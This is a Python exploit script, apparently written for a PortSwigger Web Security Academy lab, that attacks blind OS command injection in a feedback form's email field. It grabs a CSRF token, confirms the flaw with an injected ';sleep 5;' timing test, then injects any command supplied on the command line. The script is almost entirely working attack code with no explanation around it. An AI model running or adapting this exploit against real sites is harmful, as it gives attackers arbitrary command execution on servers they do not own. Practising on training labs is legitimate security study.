import requests 
import sys
from bs4 import BeautifulSoup
import time
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()

proxies = {
	"http" : "http://127.0.0.1:8080",
	"https" : "http://127.0.0.1:8080"
}

def check_vulnerable(url,command):
	csrf = csrf_token(url)
	path2 = '/feedback/submit'
	data = {
		"csrf" : csrf ,
		"name" : "root" ,
		"email" : "root%40portswigger.net;sleep 5;" ,
		"subject" : "title" ,
		"message" : "message"
	}
	start = time.time()
	print(f"[+] Executing Command 'sleep 5' to check if the target is vulnerable")
	response2 = session.post(url=url+path2,data=data,proxies=proxies,verify=False) 
	end = time.time()
	elapsed =end-start
	if elapsed>=5 :
		print(f"[+] email Parameter Is Vulnerable To Command Injection")
		print(f"[+] Executing {command} Command")
		run_command(url,command,csrf,path2)

def csrf_token(url):
	path1 = '/feedback'
	print(f"[+] Getting CSRF Token")
	response1 = session.get(url+path1,proxies=proxies,verify=False)
	soup = BeautifulSoup(response1.text , "html.parser")
	csrf = soup.find("input",{"name":"csrf"})["value"]
	print(f"[+] CSRF Token Is : {csrf}")
	return(csrf)
	


def run_command(url,command,csrf,path2):
	data = {
		"csrf" : csrf ,
		"name" : "root" ,
		"email" : "root%40portswigger.net;" + command + ";",
		"subject" : "title" ,
		"message" : "message"
	}
	session.post(url=url+path2,data=data,proxies=proxies,verify=False)
	print(f"[+] Command Executed")



def main():
	if len(sys.argv) !=  3:
		print(f"[+] Usage: {sys.argv[0]} <url> <command>")
		print(f"[+] Example {sys.argv[0]} www.example.com id")
		sys.exit(1)

	url = sys.argv[1]
	command = sys.argv[2]
	check_vulnerable(url,command)

if __name__ == "__main__":
	main()


